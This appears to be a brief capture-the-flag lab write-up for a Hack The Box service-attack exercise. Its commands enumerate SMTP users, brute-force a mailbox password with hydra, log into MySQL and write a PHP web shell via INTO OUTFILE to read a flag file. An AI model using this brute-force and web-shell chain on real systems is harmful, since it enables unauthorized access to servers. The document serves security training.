# Attacking Common Services - Easy
We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

```
HTB{...}
```

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

## You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.

```
nmap -p- -sV -A 10.129.203.7

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7

hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/rockyou.txt -f 10.129.203.7 smtp

mysql -u fiona -p987654321 -h 10.129.18.99 --ssl=0
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/phpinfo1.php'; 
SELECT LOAD_FILE('C:/xampp/htdocs/dashboard/phpinfo1.php');

http://10.129.18.99/dashboard/phpinfo1.php?cmd=dir C:\Users\Administrator\Desktop
http://10.129.18.99/dashboard/phpinfo1.php?cmd=type C:\Users\Administrator\Desktop\flag.txt

```